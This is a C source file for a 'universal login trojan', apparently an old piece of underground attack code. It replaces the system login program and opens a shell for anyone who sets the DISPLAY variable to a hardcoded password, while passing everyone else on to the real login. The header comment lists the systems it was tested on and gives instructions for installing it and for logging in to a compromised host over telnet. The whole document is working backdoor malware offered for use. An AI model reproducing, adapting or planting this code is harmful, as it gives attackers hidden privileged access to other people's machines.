/*
 * PRIVATE !! PRIVATE !! PRIVATE !! PRIVATE !! PRIVATE !! PRIVATE !! PRIVATE !!
 *	Universal login trojan by Tragedy/Dor
 *		Email: rawpower@iname.com
 *		IRC: [Dor]@ircnet
 *
 *	Login trojan for pretty much any O/S...
 *	Tested on:   Linux, BSDI 2.0, FreeBSD, IRIX 6.x, 5.x, Sunos 5.5,5.6,5.7
 *		     OSF1/DGUX4.0, 
 *	Known not to work on:
 *		SunOS 4.x and 5.4... Seems the only variable passwd to login
 *		on these versions of SunOS is the $TERM... and its passed via
 *		commandline option... should be easy to work round in time
 *
 *   #define         PASSWORD  - Set your password here
 *   #define         _PATH_LOGIN - This is where you moved the original login to
 *  login to hacked host with...
 *  from bourne shell (sh, bash) sh DISPLAY="your pass";export DISPLAY;telnet host
 *
 */

#include        <stdio.h>
#if !defined(PASSWORD)
#define 	PASSWORD	"j4l0n3n"
#endif
#if !defined(_PATH_LOGIN)
# define                _PATH_LOGIN     "/bin/login"
#endif


main (argc, argv, envp)
int argc;
char **argv, **envp;
{
char *display = getenv("DISPLAY");
  if ( display == NULL ) {
        execve(_PATH_LOGIN, argv, envp);
        perror(_PATH_LOGIN);
        exit(1);
	}
  if (!strcmp(display,PASSWORD)) {
                system("/bin/sh");
        exit(1);
        }

        execve(_PATH_LOGIN, argv, envp);
        exit(1);
}

